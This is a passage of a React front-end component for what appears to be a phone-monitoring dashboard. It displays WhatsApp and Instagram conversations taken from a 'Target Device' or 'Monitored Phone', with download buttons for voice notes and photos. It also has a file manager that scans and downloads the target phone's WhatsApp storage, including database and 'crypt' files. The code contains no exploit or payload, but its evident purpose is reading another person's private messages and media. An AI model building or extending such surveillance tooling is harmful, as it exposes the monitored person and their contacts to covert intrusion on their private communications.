                                const isTargetSent = Boolean(m.isOutgoing) || m.sender === "Target Device" || m.sender?.toLowerCase() === "me" || m.sender?.toLowerCase() === "you";
                                const isInstagramMsg = selectedApp === "instagram";
                                return (
                                  <div
                                    key={m.id}
                                    className={`flex w-full my-2.5 ${isTargetSent ? "justify-end" : "justify-start"}`}
                                  >
                                    <div
                                      className={`max-w-[85%] sm:max-w-[78%] md:max-w-[72%] rounded-2xl px-4 py-2.5 shadow-xs space-y-1 text-xs relative ${
                                        isInstagramMsg
                                          ? isTargetSent
                                            ? "bg-gradient-to-r from-purple-600 via-pink-600 to-rose-500 text-white rounded-br-xs shadow-sm"
                                            : "bg-white text-gray-900 rounded-bl-xs border border-gray-200"
                                          : isTargetSent
                                          ? "bg-[#d9fdd3] text-gray-900 rounded-br-xs border border-emerald-300/60"
                                          : "bg-white text-gray-900 rounded-bl-xs border border-gray-200"
                                      }`}
                                    >
                                      {/* Verification Header: Sent by Target vs Received from Contact */}
                                      <div
                                        className={`flex items-center justify-between gap-3 pb-1 border-b text-[10px] ${
                                          isInstagramMsg
                                            ? isTargetSent
                                              ? "border-white/20 text-white/90"
                                              : "border-gray-100 text-gray-700"
                                            : isTargetSent
                                            ? "border-emerald-600/10 text-emerald-800"
                                            : "border-gray-100 text-gray-700"
                                        }`}
                                      >
                                        <span className="font-bold flex items-center gap-1 truncate">
                                          <span className="text-sm font-black">{isTargetSent ? "↗" : "↙"}</span>
                                          <span className="truncate">
                                            {isTargetSent
                                              ? "Sent by Target (Monitored Phone)"
                                              : `Received from: ${(m.sender || selectedChatSummary.chatName).split(/\s*@\s*/)[0].trim()}`}
                                          </span>
                                        </span>
                                        <div className="flex items-center gap-1 shrink-0">
                                          {isInstagramMsg && m.targetAccount && (
                                            <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded-full border ${
                                              isTargetSent
                                                ? "bg-white/20 text-white border-white/30"
                                                : "bg-purple-100 text-purple-800 border-purple-200"
                                            }`}>
                                              @{m.targetAccount}
                                            </span>
                                          )}
                                          <span
                                            className={`text-[9px] font-semibold px-2 py-0.5 rounded-full shrink-0 border ${
                                              isInstagramMsg
                                                ? isTargetSent
                                                  ? "bg-white/20 text-white border-white/30"
                                                  : "bg-pink-50 text-pink-800 border-pink-200"
                                                : isTargetSent
                                                ? "bg-emerald-100/90 text-emerald-800 border-emerald-200"
                                                : "bg-sky-50 text-sky-800 border-sky-200"
                                            }`}
                                          >
                                            {isTargetSent ? "Sent by Target" : "Received from Contact"}
                                          </span>
                                        </div>
                                      </div>

                                      {/* Instagram Reel Link Card */}
                                      {m.reelUrl && (
                                        <div className={`my-2 p-2.5 rounded-xl border space-y-2 shadow-xs ${
                                          isInstagramMsg && isTargetSent
                                            ? "bg-black/20 border-white/30 text-white"
                                            : "bg-gradient-to-br from-purple-50 via-pink-50 to-rose-50 border-pink-200 text-gray-900"
                                        }`}>
                                          <div className="flex items-center justify-between gap-2">
                                            <span className={`inline-flex items-center gap-1 text-[11px] font-bold px-2 py-0.5 rounded-full ${
                                              isInstagramMsg && isTargetSent ? "bg-white/20 text-white" : "bg-pink-100 text-pink-700"
                                            }`}>
                                              <span>🎬</span>
                                              <span>Instagram Reel</span>
                                            </span>
                                            <a
                                              href={m.reelUrl}
                                              target="_blank"
                                              rel="noreferrer noopener"
                                              className={`inline-flex items-center gap-1 text-[11px] font-bold px-3 py-1 rounded-lg shadow-xs transition transform hover:scale-[1.02] ${
                                                isInstagramMsg && isTargetSent
                                                  ? "bg-white text-purple-700 hover:bg-gray-100"
                                                  : "bg-gradient-to-r from-purple-600 to-pink-600 text-white hover:from-purple-700 hover:to-pink-700"
                                              }`}
                                            >
                                              <span>Watch Reel</span>
                                              <span>↗</span>
                                            </a>
                                          </div>
                                          <div className={`text-[11px] font-mono break-all p-2 rounded-lg border ${
                                            isInstagramMsg && isTargetSent
                                              ? "bg-black/30 border-white/20 text-pink-200"
                                              : "bg-white/90 border-pink-200/60 text-pink-700"
                                          }`}>
                                            <a
                                              href={m.reelUrl}
                                              target="_blank"
                                              rel="noreferrer noopener"
                                              className="hover:underline font-semibold"
                                            >
                                              {m.reelUrl}
                                            </a>
                                          </div>
                                        </div>
                                      )}

                                      {/* Media: Audio Voice Note */}
                                      {m.mediaType === "audio" && (
                                        <div className="py-1 flex items-center justify-between gap-3 border-b border-black/5 pb-1 mb-1">
                                          <span className="font-semibold text-xs flex items-center gap-1">
                                            <span>🎙️</span>
                                            <span>Voice Note (.opus)</span>
                                          </span>
                                          {m.mediaPath && (
                                            <button
                                              type="button"
                                              onClick={() => handleDownloadMedia(m.mediaPath!, "voice_note.opus")}
                                              className="text-[10px] text-emerald-700 hover:underline font-semibold"
                                            >
                                              Download ⬇
                                            </button>
                                          )}
                                        </div>
                                      )}

                                      {/* Media: Image Photo */}
                                      {m.mediaType === "image" && (
                                        <div className="py-1 space-y-1">
                                          {m.mediaPath && (m.mediaPath.startsWith("http") || m.mediaPath.startsWith("data:image")) ? (
                                            <div className="rounded-xl overflow-hidden border border-black/10 shadow-xs my-1 bg-black/5">
                                              <img
                                                src={m.mediaPath}
                                                alt="Chat photo"
                                                className="w-full max-h-72 object-contain cursor-pointer hover:opacity-95 transition"
                                                onClick={() => window.open(m.mediaPath!, "_blank")}
                                              />
                                            </div>
                                          ) : (
                                            <div className={`rounded-xl p-3 border space-y-1.5 my-1 ${
                                              isInstagramMsg
                                                ? isTargetSent
                                                  ? "bg-white/10 border-white/20 text-white"
                                                  : "bg-pink-500/10 border-pink-500/20 text-pink-900"
                                                : isTargetSent
                                                ? "bg-emerald-600/10 border-emerald-600/20 text-emerald-950"
                                                : "bg-emerald-500/10 border-emerald-500/20 text-emerald-900"
                                            }`}>
                                              <div className="flex items-center justify-between gap-3">
                                                <span className="font-semibold text-xs flex items-center gap-1.5">
                                                  <span className="text-base">📷</span>
                                                  <span>Photo Attachment</span>
                                                </span>
                                                {m.mediaPath && (
                                                  <button
                                                    type="button"
                                                    onClick={() => handleDownloadMedia(m.mediaPath!, "photo.jpg")}
                                                    className={`text-[10px] text-white font-medium px-2 py-0.5 rounded transition ${
                                                      isInstagramMsg ? "bg-pink-600 hover:bg-pink-700" : "bg-emerald-600 hover:bg-emerald-700"
                                                    }`}
                                                  >
                                                    Download ⬇
                                                  </button>
                                                )}
                                              </div>
                                              {m.mediaPath && (
                                                <p className={`text-[10px] font-mono truncate ${isInstagramMsg && isTargetSent ? "text-white/70" : "text-gray-500"}`}>{m.mediaPath}</p>
                                              )}
                                            </div>
                                          )}
                                        </div>
                                      )}

                                      {/* Message Text Content */}
                                      <p className={`whitespace-pre-wrap break-words leading-relaxed text-[13px] select-text font-normal ${
                                        isInstagramMsg && isTargetSent ? "text-white" : "text-gray-900"
                                      }`}>
                                        {m.text}
                                      </p>

                                      {/* Message Footer: Timestamp & Delivery Status */}
                                      <div
                                        className={`flex items-center justify-end gap-1.5 text-[10px] pt-1 font-medium ${
                                          isInstagramMsg
                                            ? isTargetSent ? "text-white/80" : "text-gray-400"
                                            : isTargetSent ? "text-emerald-800/80" : "text-gray-400"
                                        }`}
                                      >
                                        <span>{formatMessageTime(m.timestamp)}</span>
                                        {isTargetSent && (
                                          <span
                                            className={isInstagramMsg ? "text-white font-bold text-[11px]" : "text-[#34b7f1] font-bold text-[11px]"}
                                            title="Sent by Target (Delivered)"
                                          >
                                            ✓✓
                                          </span>
                                        )}
                                      </div>
                                    </div>
                                  </div>
                                );
                              })}
                            </div>
                          ))
                        )}
                      </div>
                    </>
                  ) : (
                    <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
                      <span className="text-4xl block">💬</span>
                      <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
                      <p className="text-xs text-gray-400 max-w-sm">
                        Select a chat from the left panel to display the conversation thread and messages.
                      </p>
                    </div>
                  )
                )}
              </div>
            </>
          )}

        {/* =================================================================== */}
        {/* WHATSAPP RAW STORAGE FILE MANAGER                                   */}
        {/* =================================================================== */}
        {selectedApp === "whatsapp" && activeView === "files" && (
          <div className="flex-1 min-w-0 p-5 space-y-4 bg-white overflow-y-auto h-full min-h-0">
            <div className="flex flex-wrap items-center justify-between gap-3 bg-gray-50 p-3 rounded-lg border border-gray-100">
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={handleScanWhatsAppFiles}
                  disabled={filesLoading}
                  className="flex items-center gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold px-3 py-1.5 rounded-lg shadow-xs hover:shadow transition disabled:opacity-50"
                >
                  <span>{filesLoading ? "⌛" : "🔍"}</span>
                  <span>{filesLoading ? "Scanning Phone..." : "Scan WhatsApp Storage"}</span>
                </button>

                {fileStatus && (
                  <span className="text-xs text-gray-500 italic max-w-md truncate">
                    {fileStatus}
                  </span>
                )}
              </div>

              <div className="flex flex-wrap gap-1 text-[11px]">
                <button
                  type="button"
                  onClick={() => setCategoryFilter("all")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "all" ? "bg-gray-800 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  All Folders
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter("images")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "images" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  📷 Images
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter("voice")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "voice" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  🎙️ Voice Notes & Audio
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter("docs")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "docs" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  📄 Documents
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter("db")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "db" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  💾 Databases & Crypt
                </button>
              </div>
            </div>

            {files && categoryFilter === "all" && (
              <div className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-50 rounded-lg text-xs font-mono overflow-x-auto text-gray-600">
                <button
                  type="button"
                  onClick={() => setCurrentPath("")}
                  className="hover:underline font-semibold text-emerald-700"
                >
                  WhatsApp
                </button>
                {breadcrumbs.map((seg, i) => {
                  const segPath = breadcrumbs.slice(0, i + 1).join("/");
                  const isLast = i === breadcrumbs.length - 1;
                  return (
                    <span key={segPath} className="flex items-center gap-1.5">
                      <span className="text-gray-300">/</span>
                      <button
                        type="button"
                        onClick={() => setCurrentPath(segPath)}
                        className={`hover:underline ${isLast ? "font-bold text-gray-900" : "text-emerald-700"}`}
                      >
                        {seg}
                      </button>
                    </span>
                  );
                })}
              </div>
            )}

            {files ? (
              <div className="border border-gray-200 rounded-lg overflow-hidden">
                <div className="max-h-96 overflow-y-auto">
                  {directoryChildren.length === 0 ? (
                    <div className="p-8 text-center text-xs text-gray-400">
                      No files found in this folder or category.
                    </div>
                  ) : (
                    <table className="w-full text-xs text-left">
                      <thead className="bg-gray-50 text-gray-500 font-semibold border-b sticky top-0">
                        <tr>
                          <th className="px-3.5 py-2">Name</th>
                          <th className="px-3 py-2">Path / Type</th>
                          <th className="px-3 py-2 text-right">Size</th>
                          <th className="px-3.5 py-2 text-right pr-4">Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-gray-100">
                        {directoryChildren.map((f) => {
                          const isDownloading = downloadingFile === f.path;
                          return (
                            <tr key={f.path} className="hover:bg-emerald-50/40 transition group">
                              <td
                                className="px-3.5 py-2.5 font-medium cursor-pointer"
                                onClick={() => {
                                  if (f.isDirectory) setCurrentPath(f.path);
                                }}
                              >
                                <div className="flex items-center gap-2">
                                  <span className="text-base">
                                    {f.isDirectory
                                      ? "📁"
                                      : f.name.endsWith(".opus") || f.name.endsWith(".mp3")
                                      ? "🎙️"
                                      : /\.(jpg|jpeg|png|webp)$/i.test(f.name)
                                      ? "🖼️"
                                      : f.name.includes("crypt") || f.name.endsWith(".db")
                                      ? "💾"
                                      : "📄"}
                                  </span>
                                  <span className="text-gray-900 group-hover:text-emerald-700 transition">
                                    {f.name}
                                  </span>
                                </div>
                              </td>
                              <td className="px-3 py-2 text-gray-500 text-[11px] font-mono truncate max-w-xs">
                                {f.isDirectory ? "Folder" : f.path}
                              </td>
                              <td className="px-3 py-2 text-right text-gray-500 font-mono whitespace-nowrap">
                                {f.sizeBytes != null ? formatSize(f.sizeBytes) : "—"}
                              </td>
                              <td className="px-3.5 py-2 text-right pr-4 whitespace-nowrap">
                                {f.isDirectory ? (
                                  <button
                                    type="button"
                                    onClick={() => setCurrentPath(f.path)}
                                    className="text-[11px] text-emerald-600 hover:underline font-semibold"
                                  >
                                    Open →
                                  </button>
                                ) : (
                                  <button
                                    type="button"
                                    onClick={() => handleDownloadMedia(f.path, f.name)}
                                    disabled={isDownloading}
                                    className="inline-flex items-center gap-1 text-[11px] px-2.5 py-1 bg-white hover:bg-emerald-50 text-emerald-700 border border-emerald-300 rounded font-medium shadow-2xs transition disabled:opacity-50"
                                  >
                                    <span>{isDownloading ? "⌛" : "⬇"}</span>
                                    <span>{isDownloading ? "Downloading..." : "Download"}</span>
                                  </button>
                                )}
                              </td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  )}
                </div>
              </div>
            ) : (
              <div className="border border-dashed border-gray-200 rounded-xl p-10 text-center space-y-3">
                <span className="text-4xl block">📁</span>
                <h4 className="text-sm font-bold text-gray-800">
                  Inspect WhatsApp Media Files & Databases
                </h4>
                <p className="text-xs text-gray-500 max-w-md mx-auto leading-relaxed">
                  Click "Scan WhatsApp Storage" above to inspect WhatsApp's actual folder tree (Images, Voice Notes, Documents, and Databases) on the target device.
                </p>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
